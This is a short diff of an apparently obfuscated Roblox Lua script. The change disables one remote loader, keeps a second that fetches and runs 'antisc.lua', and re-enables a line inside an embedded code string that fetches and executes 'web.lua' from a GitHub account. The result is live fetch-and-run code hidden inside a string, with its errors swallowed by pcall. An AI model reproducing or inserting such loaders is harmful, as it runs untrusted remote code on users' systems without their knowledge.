@@ -1,6 +1,6 @@
 -- This file was protected using Luraph Obfuscator v14.7 [https://lura.ph/]
 task.spawn(function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub0/Zlhub/refs/heads/main/Center"))()
+ -- loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub0/Zlhub/refs/heads/main/Center"))()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub0/no/refs/heads/main/antisc.lua"))()
  end)
 
@@ -9,7 +9,7 @@ task.spawn(function()
         local code = [[
             task.spawn(function()
                 pcall(function()
-                    -- loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub0/no/refs/heads/main/web.lua"))()
+                     loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub0/no/refs/heads/main/web.lua"))()
                 end)
             end)
         ]]
